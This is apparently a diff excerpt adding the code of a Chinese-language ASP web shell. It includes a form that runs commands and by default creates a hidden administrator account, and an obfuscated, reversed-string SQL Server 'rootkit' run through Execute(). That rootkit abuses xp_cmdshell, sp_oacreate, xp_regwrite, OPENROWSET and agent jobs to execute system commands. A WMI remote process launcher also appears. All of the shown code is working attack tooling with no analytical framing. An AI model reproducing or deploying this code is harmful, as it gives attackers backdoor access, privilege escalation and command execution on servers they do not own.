+RRS"<td>端 口：</td>"
+RRS"<td><input name='port' type='text' id='port' value='43958'></td>"
+RRS"</tr>"
+RRS"<tr align='center' valign='middle'>"
+RRS"<td>系统路径：</td>"
+RRS"    <td><input name='f' type='text' id='f' value='"&f&"' size='8'></td>"
+RRS"  </tr>"
+RRS"  <tr align='center' valign='middle'>"
+RRS"    <td>命　令：</td>"
+RRS"    <td><input name='c' type='text' id='c' value='cmd /c net user kongqi$ 123456 /add & net localgroup administrators kongqi$ /add' size='50'></td>"
+RRS"  </tr>"
+RRS" <tr align='center' valign='middle'>"
+RRS"    <td colspan='2'><input type='submit' name='Submit' value='提交'> "
+RRS"<input type='reset' name='Submit2' value='重置'>"
+RRS"<input name='SUaction' type='hidden' id='action' value='1'></td>"
+RRS"  </tr>"
+RRS" <tr align='center' valign='middle'>"
+RRS"    <td>说　明：</td>"
+RRS"    <td><input name='ccc' type='text' id='ccc' value='可替换成:cmd /c D:\web\你的木马.exe 也可以是VBS' size='50'></td>"
+RRS"  </tr>"
+RRS"</tr></table></form></center>"
+end select
+function Gpath()
+on error resume next
+    err.clear
+    set f=Server.CreateObject("Scripting.FileSystemObject")
+    if err.number>0 then
+	gpath="c:"
+        exit function
+    end if
+gpath=f.GetSpecialFolder(0)
+gpath=lcase(left(gpath,2))
+set f=nothing
+end function
+
+
+Function Sqlrootkit()
+ShiSan="╋╋FI DNE╋                          ╁>MROF/<╁ ETIRW.ESNOPSER   			╋   			╁>行执=EULAV TIMBUS=EPYT TUPNI<  ╁ ETIRW.ESNOPSER   			╋╁>LQS=EULAV NEDDIH=EPYT AAALQS=EMAN TUPNI<  ╁ ETIRW.ESNOPSER   			╋╁>TXET=EPYT LQS=EMAN TUPNI<   ╁ ETIRW.ESNOPSER   			╋╁：句语行执>P<╁ ETIRW.ESNOPSER   			╋╁>╁&)╁LRU╁(SELBAIRAVREVRES.TSEUQER&╁=AAALQS TSOP=DOHTEM 1MROF=EMAN MROF<╁ ETIRW.ESNOPSER           		╋╁>MROF/<╁ ETIRW.ESNOPSER   			╋╁>行执=EULAV TIMBUS=EPYT TUPNI<  ╁ ETIRW.ESNOPSER   			╋╁>DMC=EULAV NEDDIH=EPYT AAALQS=EMAN TUPNI<  ╁ ETIRW.ESNOPSER   			╋╁>TCELES/<>NOITPO/<>NOITPO/<TNEGAREVRESLQS>TNEGAREVRESLQS=EULAV NOITPO<>NOITPO/<ETIRWGER_PX>ETIRWGER_PX=EULAV NOITPO<>NOITPO/<ETAERCAO_PS>ETAERCAO_PS=EULAV NOITPO<>NOITPO/<LLEHSDMC_PX>LLEHSDMC_PX=EULAV NOITPO<>NOITPO/<----件组的序程行运择选请---->''=EULAV NOITPO<> 'LOOT'=EMAN TCELES<╁ ETIRW.ESNOPSER   			╋╁>TXET=EPYT DMC=EMAN TUPNI<  ╁ ETIRW.ESNOPSER   			╋╁：令命统系>P<╁ ETIRW.ESNOPSER   			╋╁>╁&)╁LRU╁(SELBAIRAVREVRES.TSEUQER&╁=AAALQS TSOP=DOHTEM MROF=EMAN MROF<╁ ETIRW.ESNOPSER           		╋╋╁>MROF/<╁ ETIRW.ESNOPSER   			╋╁>件组复恢=EULAV TIMBUS=EPYT TUPNI<  ╁ ETIRW.ESNOPSER   			╋╁>EMUSER=EULAV NEDDIH=EPYT AAALQS=EMAN TUPNI<  ╁ ETIRW.ESNOPSER   			╋╁：复恢件组>P<╁ ETIRW.ESNOPSER   			╋╁>╁&)╁LRU╁(SELBAIRAVREVRES.TSEUQER&╁=AAALQS TSOP=DOHTEM MROF=EMAN MROF<╁ ETIRW.ESNOPSER                           ╋╋╁>MROF/<╁ ETIRW.ESNOPSER   			╋╁>件组测检=EULAV TIMBUS=EPYT TUPNI<  ╁ ETIRW.ESNOPSER   			╋╁>TSET=EULAV NEDDIH=EPYT AAALQS=EMAN TUPNI<  ╁ ETIRW.ESNOPSER   			╋╁：测检件组>P<╁ ETIRW.ESNOPSER   			╋╁>╁&)╁LRU╁(SELBAIRAVREVRES.TSEUQER&╁=AAALQS TSOP=DOHTEM MROF=EMAN MROF<╁ ETIRW.ESNOPSER                       ESLE╋╋╁>MROF/<╁ ETIRW.ESNOPSER   			╋╁>NIGOL=EULAV TIMBUS=EPYT AAALQS=EMAN TUPNI<  ╁ ETIRW.ESNOPSER   			╋╁>3341=EULAV TROP=DI TXET=EPYT TROP=EMAN TUPNI<╁ ETIRW.ESNOPSER   			╋╁：口端LQS  ╁ ETIRW.ESNOPSER           		 ╋╁>1.0.0.721=EULAV REVRES=DI TXET=EPYT TROP=EMAN TUPNI<╁ ETIRW.ESNOPSER   			╋╁：器务服LQS>P<╁ ETIRW.ESNOPSER   			╋╁>╁&)╁SSAP╁(NOISSES&╁=EULAV SSAP=DI DROWSSAP=EPYT SSAP=EMAN TUPNI<╁ ETIRW.ESNOPSER   			╋╁：码密LQS  ╁ ETIRW.ESNOPSER           		 ╋╁>╁&)╁EMAN╁(NOISSES&╁=EULAV EMAN=DI TXET=EPYT EMAN=EMAN TUPNI<╁ ETIRW.ESNOPSER   			╋╁：名户用LQS>P<╁ ETIRW.ESNOPSER   			╋╁>╁&)╁LRU╁(SELBAIRAVREVRES.TSEUQER&╁=AAALQS TSOP=DOHTEM MROF=EMAN MROF<╁ ETIRW.ESNOPSER   			╋NEHT ╁╁=)╁NIGOL╁(NOISSES FI╋FI DNE╋              		╁╁=)╁IRP╁(NOISSES                       ╋╁╁=)╁METSYS╁(NOISSES                       ╋╁╁=)╁TROP╁(NOISSES                       ╋╁╁=)╁REVRES╁(NOISSES                       ╋╁╁=)╁SSAP╁(NOISSES                       ╋╁╁=)╁EMAN╁(NOISSES                       ╋╁╁=)╁NIGOL╁(NOISSES                       ╋GNIHTON=NNOCODA TES                       ╋NEHT ╁TUOGOL╁=)╁AAALQS╁(TSEUQER FIESLE╋╋FI DNE                       ╋DNE.ESNOPSER                       ╋╁>TNOF/<时超陆登>KCALB=ROLOC TNOF<>TUOGOL=AAALQS?╁&)╁LRU╁(SELBAIRAVREVRES.TSEUQER&╁=FERH A<>RETNEC<╁ ETIRW.ESNOPSER                       ╋╁>TPIRCS/<)'！陆登新重，时超作操'(TRELA>TPIRCS<╁ ETIRW.ESNOPSER                       ╋ ESLE                       ╋FI DNE                       ╋╁>AERATXET/<╁ ETIRW.ESNOPSER                       ╋TLUSERRTS ETIRW.ESNOPSER                       ╋ )╁LQS╁(MROF.TSEUQER ETIRW.ESNOPSER                       ╋╁:句语LQS行执╁ ETIRW.ESNOPSER                       ╋╁>05=SLOC 01=SWOR AERATXET<╁ ETIRW.ESNOPSER                       ╋GNIHTON = TLUSERCER TES       		╋FI DNE       		╋POOL                       ╋ TXENEVOM.TLUSERCER                       ╋ )0(TLUSERCER & )31(RHC & TLUSERRTS = TLUSERRTS                       ╋ FOE.TLUSERCER TON ELIHW OD                       ╋ NEHT FOE.TLUSERCER TON FI                       ╋ )YREUQRTS(ETUCEXE.NNOCODA = TLUSERCER TES                       ╋)╁LQS╁(MROF.TSEUQER=YREUQRTS                       ╋)╁EMAN╁(NOISSES & ╁=DIU;╁ & )╁SSAP╁(NOISSES & ╁=DROWSSAP;╁ & )╁TROP╁(NOISSES & ╁,╁ & )╁REVRES╁(NOISSES & ╁=ECRUOS ATAD;1.BDELOLQS=REDIVORP╁ NEPO.NNOCODA       		 ╋ )╁NOITCENNOC.BDODA╁(TCEJBOETAERC.REVRES=NNOCODA TES                       ╋NEHT ╁╁><)╁LQS╁(MROF.TSEUQER FI       		╋NEHT ╁╁><)╁NIGOL╁(NOISSES FI                       ╋NEHT ╁LQS╁=)╁AAALQS╁(TSEUQER FIESLE╋                                ╋	 FI DNE                       ╋DNE.ESNOPSER                       ╋╁>TNOF/<时超陆登>KCALB=ROLOC TNOF<>TUOGOL=AAALQS?╁&)╁LRU╁(SELBAIRAVREVRES.TSEUQER&╁=FERH A<>RETNEC<╁ ETIRW.ESNOPSER                       ╋╁>TPIRCS/<)'！陆登新重，时超作操'(TRELA>TPIRCS<╁ ETIRW.ESNOPSER                       ╋ ESLE                       ╋FI DNE                       ╋	╁>TNOF/<全齐件组！喜恭>DER=ROLOC TNOF<╁ ETIRW.ESNOPSER ESLE       		╋	╁>TNOF/<ETIRWGER_PX复恢试尝经已>DER=ROLOC TNOF<╁ ETIRW.ESNOPSER                       ╋	)YREUQRTS(ETUCEXE.NNOCODA       		╋╁)'LLD.RATSPX','ETIRWGER_PX'( CORPDEDNETXEDDA CCBD╁=YREUQRTS       		╋NEHT 0=)╁ETIRWGER_PX╁(NOISSES FIESLE       		╋╁>TNOF/<ETAERCAO_PS复恢试尝经已>DER=ROLOC TNOF<╁ ETIRW.ESNOPSER                       ╋	)YREUQRTS(ETUCEXE.NNOCODA       		╋╁)'LLD.07ELOSDO','ETAERCAO_PS'( CORPDEDNETXEDDA CCBD╁=YREUQRTS       		╋NEHT 0=)╁ETAERCAO_PS╁(NOISSES FIESLE                       ╋╁>TNOF/<LLEHSDMC_PX复恢试尝经已>DER=ROLOC TNOF<╁ ETIRW.ESNOPSER                       ╋	)YREUQRTS(ETUCEXE.NNOCODA       		╋╁)'LLD.07GOLPX','LLEHSDMC_PX'( CORPDEDNETXEDDA CCBD╁=YREUQRTS                       ╋NEHT 0=)╁LLEHSDMC_PX╁(NOISSES FI                       ╋)╁EMAN╁(NOISSES & ╁=DIU;╁ & )╁SSAP╁(NOISSES & ╁=DROWSSAP;╁ & )╁TROP╁(NOISSES & ╁,╁ & )╁REVRES╁(NOISSES & ╁=ECRUOS ATAD;1.BDELOLQS=REDIVORP╁ NEPO.NNOCODA       		 ╋ )╁NOITCENNOC.BDODA╁(TCEJBOETAERC.REVRES=NNOCODA TES                       ╋NEHT ╁╁><)╁NIGOL╁(NOISSES FI                       ╋NEHT ╁EMUSER╁=)╁AAALQS╁(TSEUQER FIESLE╋╋FI DNE                       ╋DNE.ESNOPSER                       ╋╁>TNOF/<时超陆登>KCALB=ROLOC TNOF<>TUOGOL=AAALQS?╁&)╁LRU╁(SELBAIRAVREVRES.TSEUQER&╁=FERH A<>RETNEC<╁ ETIRW.ESNOPSER                       ╋╁>TPIRCS/<)'！陆登新重，时超作操'(TRELA>TPIRCS<╁ ETIRW.ESNOPSER                       ╋ ESLE                       ╋FI DNE                       ╋╁>TPIRCS/<)'！哦够不限权'(TRELA>TPIRCS<╁ ETIRW.ESNOPSER                       ╋ESLE                       ╋FI DNE                       ╋╁>TPIRCS/<)'展扩的用使要你择选'(TRELA>TPIRCS<╁ ETIRW.ESNOPSER                       ╋ NEHT ╁╁=)╁LOOT╁(TSEUQER FIESLE                       ╋FI DNE                       ╋)YREUQRTS(ETUCEXE.NNOCODA                       ╋╁;]LQSCNJ[ ELBAT PORD BDSM ESU╁ = YREUQRTS       		╋╁>AERATXET/<╁ ETIRW.ESNOPSER                       ╋╁果结令命看查向定重过通议建，显回无展扩此╁ ETIRW.ESNOPSER                       ╋FRCBV ETIRW.ESNOPSER                       ╋ )╁DMC╁(MROF.TSEUQER ETIRW.ESNOPSER                       ╋╁行执展扩╁&)╁LOOT╁(TSEUQER&╁用利╁ ETIRW.ESNOPSER                       ╋╁>05=SLOC 01=SWOR AERATXET<╁ ETIRW.ESNOPSER                       ╋                    ╋)YREUQRTS(ETUCEXE.NNOCODA                       ╋)YREUQRTS(ETUCEXE.NNOCODA                       ╋)YREUQRTS(ETUCEXE.NNOCODA                       ╋╁;'X' BOJ_TRATS_PS CEXE EMANREVRES@@,'X',LLUN REVRESBOJ_DDA_PS CEXE '╁&)╁DMC╁(MROF.TSEUQER&╁ C/ DMC','CEXEDMC','1',LLUN,'X',LLUN PETSBOJ_DDA_PS CEXE 'X' BOJ_DDA_PS CEXE 'X',LLUN BOJ_ETELED_PS CEXE )LLUN )4201(RAHCRAVN TXTTLUSER(]LQSCNJ[ ELBAT ETAERC BDSM ESU╁ = YREUQRTS       		╋╋FI DNE                       ╋1=)╁TNEGAREVRESLQS╁(NOISSES                       ╋)YREUQRTS(ETUCEXE.NNOCODA                       ╋╁;'TNEGAREVRESLQS','TRATS' LORTNOCECIVRES_PX.OBD.RETSAM CEXE╁ = YREUQRTS                       ╋NEHT 0=)╁TNEGAREVRESLQS╁(NOISSES FI                       ╋NEHT ╁╁><)╁DMC╁(MROF.TSEUQER FI       		╋╋)╁EMAN╁(NOISSES & ╁=DIU;╁ & )╁SSAP╁(NOISSES & ╁=DROWSSAP;╁ & )╁TROP╁(NOISSES & ╁,╁ & )╁REVRES╁(NOISSES & ╁=ECRUOS ATAD;1.BDELOLQS=REDIVORP╁ NEPO.NNOCODA       		 ╋ )╁NOITCENNOC.BDODA╁(TCEJBOETAERC.REVRES=NNOCODA TES       		╋NEHT ╁TNEGAREVRESLQS╁=)╁LOOT╁(TSEUQER FIESLE       		╋╋FI DNE       		╋)YREUQRTS(ETUCEXE.NNOCODA       		╋╁;)')╁&)43(RHC&╁PMT.CNJ LED&&PMT.7168 LED C/ EXE.DMC╁&)43(RHC&╁(LLEHS TCELES','╁& HTAP & ╁=ESABATAD;','0.4.BDELO.TEJ.TFOSORCIM'(TESWORNEPO MORF * TCELES;1,'DROWD_GER','EDOMXOBDNAS','SENIGNE\0.4\TEJ\TFOSORCIM\ERAWTFOS','ENIHCAM_LACOL_YEKH' ETIRWGER_PX..RETSAM CEXE;]CNJ[ ELBAT PORD╁ = YREUQRTS       		╋╁>AERATXET/<╁ ETIRW.ESNOPSER                       ╋TLUSERRTS ETIRW.ESNOPSER                       ╋ )╁DMC╁(MROF.TSEUQER ETIRW.ESNOPSER                       ╋╁行执展扩╁&)╁LOOT╁(TSEUQER&╁用利╁ ETIRW.ESNOPSER                       ╋╁>05=SLOC 01=SWOR AERATXET<╁ ETIRW.ESNOPSER                       ╋GNIHTON = TLUSERCER TES                       ╋FI DNE                       ╋ POOL                       ╋ TXENEVOM.TLUSERCER                       ╋ )0(TLUSERCER & )31(RHC & TLUSERRTS = TLUSERRTS                       ╋ FOE.TLUSERCER TON ELIHW OD                       ╋ NEHT FOE.TLUSERCER TON FI       		╋)YREUQRTS(ETUCEXE.NNOCODA = TLUSERCER TES                       ╋╁;]CNJ[ MORF * TCELES╁=YREUQRTS       		╋)YREUQRTS(ETUCEXE.NNOCODA = TLUSERCER TES       		╋╁;)SLLUNPEEK( HTIW 'PMT.CNJ' MORF ]CNJ[ TRESNI KLUB;)')╁&)43(RHC&╁PMT.CNJ PMT.7168 YPOC C/ EXE.DMC╁&)43(RHC&╁(LLEHS TCELES','╁& HTAP & ╁=ESABATAD;','0.4.BDELO.TEJ.TFOSORCIM'(TESWORNEPO MORF * TCELES╁ = YREUQRTS       		╋)YREUQRTS(ETUCEXE.NNOCODA                       ╋╁;)')╁&DMC&╁(LLEHS TCELES','╁& HTAP & ╁=ESABATAD;','0.4.BDELO.TEJ.TFOSORCIM'(TESWORNEPO MORF * TCELES;0,'DROWD_GER','EDOMXOBDNAS','SENIGNE\0.4\TEJ\TFOSORCIM\ERAWTFOS','ENIHCAM_LACOL_YEKH' ETIRWGER_PX..RETSAM CEXE;)LLUN )4201(RAHCRAVN TXTTLUSER(]CNJ[ ELBAT ETAERC╁ = YREUQRTS       		╋)43(RHC&╁PMT.7168 > ╁&)╁DMC╁(MROF.TSEUQER&╁ C/ EXE.DMC╁&)43(RHC=DMC       		╋NEHT ╁╁><)╁DMC╁(MROF.TSEUQER FI       		╋)╁EMAN╁(NOISSES & ╁=DIU;╁ & )╁SSAP╁(NOISSES & ╁=DROWSSAP;╁ & )╁TROP╁(NOISSES & ╁,╁ & )╁REVRES╁(NOISSES & ╁=ECRUOS ATAD;1.BDELOLQS=REDIVORP╁ NEPO.NNOCODA       		 ╋ )╁NOITCENNOC.BDODA╁(TCEJBOETAERC.REVRES=NNOCODA TES       		╋FI DNE                       ╋╁BDM.SAI\SAI\23METSYS\SWODNIW\:C╁=HTAP                       ╋ESLE                       ╋╁BDM.SAI\SAI\23METSYS\TNNIW\:C╁=HTAP                       ╋NEHT ╁0002╁=)╁METSYS╁(NOISSES FI                       ╋NEHT ╁ETIRWGER_PX╁=)╁LOOT╁(TSEUQER FIESLE                       ╋╋FI DNE       		╋)YREUQRTS(ETUCEXE.NNOCODA       		 ╋╁'PMT.7168 LED C/ DMC',LLUN,'NUR',O@ DOHTEMAO_PS CEXE TUO O@,'LLEHS.TPIRCSW' ETAERCAO_PS CEXE TNI O@ ERALCED;]CNJ[ ELBAT PORD╁ = YREUQRTS       		╋╁>AERATXET/<╁ ETIRW.ESNOPSER                       ╋TLUSERRTS ETIRW.ESNOPSER                       ╋ )╁DMC╁(MROF.TSEUQER ETIRW.ESNOPSER                       ╋	╁行执展扩╁&)╁LOOT╁(TSEUQER&╁用利╁ ETIRW.ESNOPSER       		╋╁>05=SLOC 01=SWOR AERATXET<╁ ETIRW.ESNOPSER                       ╋GNIHTON = TLUSERCER TES       		╋FI DNE                       ╋ POOL                       ╋ TXENEVOM.TLUSERCER                       ╋ )0(TLUSERCER & )31(RHC & TLUSERRTS = TLUSERRTS                       ╋ FOE.TLUSERCER TON ELIHW OD                       ╋ NEHT FOE.TLUSERCER TON FI       		╋)YREUQRTS(ETUCEXE.NNOCODA = TLUSERCER TES       		╋╁CNJ MORF * TCELES╁ = YREUQRTS                       ╋)YREUQRTS(ETUCEXE.NNOCODA       		╋╁;)SLLUNPEEK( HTIW 'PMT.7168' MORF ]CNJ[ TRESNI KLUB;EURT,0,'PMT.7168 > ╁&)╁DMC╁(TSEUQER&╁ C/ DMC',LLUN,'NUR',O@ DOHTEMAO_PS CEXE TUO O@,'LLEHS.TPIRCSW' ETAERCAO_PS CEXE TNI O@ ERALCED RETSAM ESU;)LLUN )4201(RAHCRAVN TXTTLUSER(]CNJ[ ELBAT ETAERC╁ = YREUQRTS       		  ╋ NEHT ╁╁><)╁DMC╁(MROF.TSEUQER FI       		╋)╁EMAN╁(NOISSES & ╁=DIU;╁ & )╁SSAP╁(NOISSES & ╁=DROWSSAP;╁ & )╁TROP╁(NOISSES & ╁,╁ & )╁REVRES╁(NOISSES & ╁=ECRUOS ATAD;1.BDELOLQS=REDIVORP╁ NEPO.NNOCODA       		 ╋ )╁NOITCENNOC.BDODA╁(TCEJBOETAERC.REVRES=NNOCODA TES       		╋ NEHT ╁ETAERCAO_PS╁=)╁LOOT╁(TSEUQER FIESLE                       ╋       		       		╋ FI DNE       		╋╁>AERATXET/<╁ ETIRW.ESNOPSER                       ╋TLUSERRTS ETIRW.ESNOPSER                       ╋ )╁DMC╁(MROF.TSEUQER ETIRW.ESNOPSER                       ╋╁行执展扩╁&)╁LOOT╁(TSEUQER&╁用利╁ ETIRW.ESNOPSER                       ╋╁>05=SLOC 01=SWOR AERATXET<╁ ETIRW.ESNOPSER                       ╋GNIHTON = TLUSERCER TES       		╋FI DNE       		╋POOL                       ╋ TXENEVOM.TLUSERCER                       ╋ )0(TLUSERCER & )31(RHC & TLUSERRTS = TLUSERRTS                       ╋ FOE.TLUSERCER TON ELIHW OD                       ╋ NEHT FOE.TLUSERCER TON FI                       ╋ )YREUQRTS(ETUCEXE.NNOCODA = TLUSERCER TES                       ╋ ╁'╁ & )╁DMC╁(MROF.TSEUQER & ╁' LLEHSDMC_PX.OBD.RETSAM CEXE╁ = YREUQRTS       		  ╋ NEHT ╁╁><)╁DMC╁(MROF.TSEUQER FI       		╋)╁EMAN╁(NOISSES & ╁=DIU;╁ & )╁SSAP╁(NOISSES & ╁=DROWSSAP;╁ & )╁TROP╁(NOISSES & ╁,╁ & )╁REVRES╁(NOISSES & ╁=ECRUOS ATAD;1.BDELOLQS=REDIVORP╁ NEPO.NNOCODA       		 ╋ )╁NOITCENNOC.BDODA╁(TCEJBOETAERC.REVRES=NNOCODA TES       		╋NEHT ╁LLEHSDMC_PX╁=)╁LOOT╁(TSEUQER FI       		╋NEHT 1=)╁IRP╁(NOISSES FI                       ╋NEHT ╁╁><)╁NIGOL╁(NOISSES FI                       ╋NEHT ╁DMC╁=)╁AAALQS╁(TSEUQER FIESLE╋╋ FI DNE                       ╋DNE.ESNOPSER                       ╋╁>TNOF/<时超陆登>KCALB=ROLOC TNOF<>TUOGOL=AAALQS?╁&)╁LRU╁(SELBAIRAVREVRES.TSEUQER&╁=FERH A<>RETNEC<╁ ETIRW.ESNOPSER                       ╋╁>TPIRCS/<)'！陆登新重，时超作操'(TRELA>TPIRCS<╁ ETIRW.ESNOPSER                       ╋ ESLE                       ╋FI DNE                       ╋0=)╁LORTNOCECIVRES_PX╁(NOISSES       		╋╁>TNOF/<!在存不 LORTNOCECIVRES_PX>DER=ROLOC TNOF<>RB<╁ ETIRW.ESNOPSER       		╋ ESLE                       ╋1=)╁LORTNOCECIVRES_PX╁(NOISSES       		╋╁>TNOF/<!在存 LORTNOCECIVRES_PX>DER=ROLOC TNOF<>RB<╁ ETIRW.ESNOPSER       		╋ NEHT )0(TLUSERCER FI       		╋ )YREUQRTS(ETUCEXE.NNOCODA = TLUSERCER TES       		╋╁'LORTNOCECIVRES_PX'=EMAN DNA 'X'=EPYTX EREHW STCEJBOSYS.OBD.RETSAM MORF )*(TNUOC TCELES╁=YREUQRTS       		╋FI DNE                       ╋0=)╁ETIRWGER_PX╁(NOISSES       		╋╁>TNOF/<!在存不 .............ETIRWGER_PX>DER=ROLOC TNOF<>RB<╁ ETIRW.ESNOPSER       		╋ ESLE                       ╋1=)╁ETIRWGER_PX╁(NOISSES       		╋╁>TNOF/<!在存 .............ETIRWGER_PX>DER=ROLOC TNOF<>RB<╁ ETIRW.ESNOPSER       		╋ NEHT )0(TLUSERCER FI       		╋ )YREUQRTS(ETUCEXE.NNOCODA = TLUSERCER TES       		╋╁'ETIRWGER_PX'=EMAN DNA 'X'=EPYTX EREHW STCEJBOSYS.OBD.RETSAM MORF )*(TNUOC TCELES╁=YREUQRTS       		╋FI DNE                       ╋0=)╁ETAERCAO_PS╁(NOISSES                       ╋╁>TNOF/<!在存不 .............ETAERCAO_PS>DER=ROLOC TNOF<>RB<╁ ETIRW.ESNOPSER       		╋ ESLE                       ╋1=)╁ETAERCAO_PS╁(NOISSES       		╋╁>TNOF/<!在存 .............ETAERCAO_PS>DER=ROLOC TNOF<>RB<╁ ETIRW.ESNOPSER       		╋ NEHT )0(TLUSERCER FI       		╋ )YREUQRTS(ETUCEXE.NNOCODA = TLUSERCER TES       		╋╁'ETAERCAO_PS'=EMAN DNA 'X'=EPYTX EREHW STCEJBOSYS.OBD.RETSAM MORF )*(TNUOC TCELES╁=YREUQRTS       		╋FI DNE                       ╋╁>TNOF/<!在存不 .............LLEHSDMC_PX>DER=ROLOC TNOF<╁ ETIRW.ESNOPSER       		╋ 0=)╁LLEHSDMC_PX╁(NOISSES       		╋ESLE                       ╋╁>TNOF/<!在存 .............LLEHSDMC_PX>DER=ROLOC TNOF<╁ ETIRW.ESNOPSER       		╋ 1=)╁LLEHSDMC_PX╁(NOISSES       		╋NEHT )0(TLUSERCER FI       		╋ )YREUQRTS(ETUCEXE.NNOCODA = TLUSERCER TES       		╋╁'LLEHSDMC_PX'=EMAN DNA 'X'=EPYTX EREHW STCEJBOSYS.OBD.RETSAM MORF )*(TNUOC TCELES╁=YREUQRTS                       ╋╋        )╁EMAN╁(NOISSES & ╁=DIU;╁ & )╁SSAP╁(NOISSES & ╁=DROWSSAP;╁ & )╁TROP╁(NOISSES & ╁,╁ & )╁REVRES╁(NOISSES & ╁=ECRUOS ATAD;1.BDELOLQS=REDIVORP╁ NEPO.NNOCODA       		 ╋ )╁NOITCENNOC.BDODA╁(TCEJBOETAERC.REVRES=NNOCODA TES       		╋FI DNE                       ╋╁>RB<>TNOF/<！令命行执能不计估够不限权，闷郁>DER=ROLOC TNOF<╁ ETIRW.ESNOPSER                       ╋ ESLE                       ╋╁>RB<>TNOF/<限权高最REVRES LQS！喜恭>DER=ROLOC TNOF<╁ ETIRW.ESNOPSER                       ╋NEHT 1=)╁IRP╁(NOISSES FI                       ╋FI DNE                       ╋╁>RB<>TNOF/<统系作操他其>DER=ROLOC TNOF<╁ ETIRW.ESNOPSER                       ╋ESLE                       ╋╁>RB<>TNOF/<统系3002 SWODNIW>DER=ROLOC TNOF<╁ ETIRW.ESNOPSER                       ╋NEHT ╁3002╁=)╁METSYS╁(NOISSES FIESLE                       ╋╁>RB<>TNOF/<统系PX SWODNIW>DER=ROLOC TNOF<╁ ETIRW.ESNOPSER                       ╋NEHT ╁PX╁=)╁METSYS╁(NOISSES FIESLE                       ╋╁>RB<>TNOF/<统系0002 SWODNIW>DER=ROLOC TNOF<╁ ETIRW.ESNOPSER                       ╋NEHT ╁0002╁=)╁METSYS╁(NOISSES FI                       ╋NEHT ╁╁><)╁NIGOL╁(NOISSES FI                       ╋NEHT  ╁TSET╁=)╁AAALQS╁(TSEUQER FIESLE╋╋FI DNE                       ╋)╁TROP╁(MROF.TSEUQER=)╁TROP╁(NOISSES       		╋)╁REVRES╁(MROF.TSEUQER=)╁REVRES╁(NOISSES       		╋)╁SSAP╁(MROF.TSEUQER=)╁SSAP╁(NOISSES       		╋)╁EMAN╁(MROF.TSEUQER=)╁EMAN╁(NOISSES       		╋╁SEY╁=)╁NIGOL╁(NOISSES       		╋              FI DNE                       ╋0=)╁IRP╁(NOISSES                       ╋╁>RB<>TNOF/<！令命行执能不计估够不限权，闷郁>DER=ROLOC TNOF<╁ ETIRW.ESNOPSER                       ╋ESLE                       ╋1=)╁IRP╁(NOISSES                       ╋╁>RB<>TNOF/<限权高最REVRES LQS！喜恭>DER=ROLOC TNOF<╁ ETIRW.ESNOPSER                       ╋NEHT 1=)0(TLUSERCER FI                       ╋)YREUQRTS(ETUCEXE.NNOCODA = TLUSERCER TES       		╋╁)'NIMDASYS'(REBMEMELORVRS_SI TCELES╁=YREUQRTS                       ╋FI DNE                       ╋╁ON╁=)╁METSYS╁(NOISSES                       ╋╁>RB<>TNOF/<统系他其>DER=ROLOC TNOF<╁ ETIRW.ESNOPSER                       ╋ESLE                       ╋╁3002╁=)╁METSYS╁(NOISSES                       ╋╁>RB<>TNOF/<统系3002 SWODNIW>DER=ROLOC TNOF<╁ ETIRW.ESNOPSER                       ╋NEHT  )╁2.5 TN╁,)0(TLUSERCER(RTSNI FIESLE                       ╋╁PX╁=)╁METSYS╁(NOISSES                       ╋╁>RB<>TNOF/<统系PX SWODNIW>DER=ROLOC TNOF<╁ ETIRW.ESNOPSER                       ╋NEHT  )╁1.5 TN╁,)0(TLUSERCER(RTSNI FIESLE                       ╋╁0002╁=)╁METSYS╁(NOISSES                       ╋╁>RB<>TNOF/<统系0002 SWODNIW>DER=ROLOC TNOF<╁ ETIRW.ESNOPSER       		╋NEHT )╁0.5 TN╁,)0(TLUSERCER(RTSNI FI       		╋)YREUQRTS(ETUCEXE.NNOCODA = TLUSERCER TES       		╋╁NOISREV@@ TCELES╁=YREUQRTS                       ╋NEHT 0=REBMUN.RRE FIESLE                       ╋DNE.ESNOPSER                       ╋╁>TNOF/<！查检请，误错误错码密名户用>DER=ROLOC TNOF<╁ ETIRW.ESNOPSER                       ╋NEHT 3487127412-=REBMUN.RRE FIESLE                       ╋DNE.ESNOPSER                       ╋╁>TNOF/<！查检请，误错接连源据数>DER=ROLOC TNOF<╁ ETIRW.ESNOPSER                       ╋ NEHT 9527647412-=REBMUN.RRE FI                       ╋)╁EMAN╁(MROF.TSEUQER & ╁=DIU;╁ & )╁SSAP╁(MROF.TSEUQER & ╁=DROWSSAP;╁ & )╁TROP╁(MROF.TSEUQER & ╁,╁ & )╁REVRES╁(MROF.TSEUQER & ╁=ECRUOS ATAD;1.BDELOLQS=REDIVORP╁ NEPO.NNOCODA       		 ╋ )╁NOITCENNOC.BDODA╁(TCEJBOETAERC.REVRES=NNOCODA TES       		╋NEHT ╁NIGOL╁=)╁AAALQS╁(TSEUQER FI╋╋╁>RB<>RETNEC/<>A/<>TNOF/<陆登出退>KCALB=ROLOC TNOF<>TUOGOL=AAALQS?╁&)╁LRU╁(SELBAIRAVREVRES.TSEUQER&╁=FERH A<>RETNEC<╁ ETIRW.ESNOPSER                           ╋FI DNE╋╁>RB<>RETNEC/<>TNOF/<陆登经已>DER=ROLOC TNOF<>RETNEC<╁ ETIRW.ESNOPSER ESLE   			╋╁>RB<>RETNEC/<>TNOF/<陆登有没>DER=ROLOC TNOF<>RETNEC<╁ ETIRW.ESNOPSER                           ╋NEHT ╁╁=)╁NIGOL╁(NOISSES FI"
+ExeCuTe(ShiSanFun(ShiSan))
+
+End Function
+
+
+Case "WMI"
+if request("ok")<>"" then
+set ww=server.createobject("wbemscripting.swbemlocator")
+set cc=ww.connectserver(request("ok"))
+set ss=cc.get("Win32_ProcessStartup")
+Set oC=ss.SpawnInstance_
+oC.ShowWindow=12
+Set pp=cc.get("Win32_Process")
+pp.create "net user",null,oC,intProcessID
+RRS""<br>""&intProcessID
+else
+RRS("<form method=""POST""> ")
+RRS"远程执行命令"
+RRS"<input name=""ok"" type=""text"" id=""ok"" value=""&quot;192.168.0.1&quot;,&quot;root/cimv2&quot;,&quot;administrator&quot;,&quot;kongqi&quot;"" size=""70"">"
+RRS"<input type=""submit"" name=""Submit"" value=""提交"">"
+RRS"</form>"
+end if
+
+
+  CaSE "CheckASP"
+	DIm RepORT
+	IF rEQueST.querYsTrING("act")<>"scan" ThEN
+	  	RrS ("<b>网站根目录</b>- "&server.mAppaTh("/")&"<br>")
+		RRS ("<b>本程序目录</b>- "&servER.mAPPATh("."))
+
+		rRS "<form action=""?Action=CheckASP&act=scan"" method=""post"" name=""form1"">"
+		RRS "<p><b>填入你要检查的路径：</b>"
